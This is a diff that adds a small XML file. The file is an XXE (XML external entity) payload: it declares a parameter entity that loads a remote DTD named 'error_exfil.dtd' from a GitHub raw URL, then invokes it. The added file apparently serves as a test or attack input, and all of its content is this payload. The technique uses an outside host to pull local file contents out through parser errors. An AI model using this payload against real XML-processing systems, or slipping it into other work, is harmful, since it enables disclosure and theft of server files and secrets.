@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % dtd SYSTEM "http://raw.githubusercontent.com/Alolowiwael/dtd-host/main/error_exfil.dtd">
+  %dtd;
+]>
+<root>test</root>
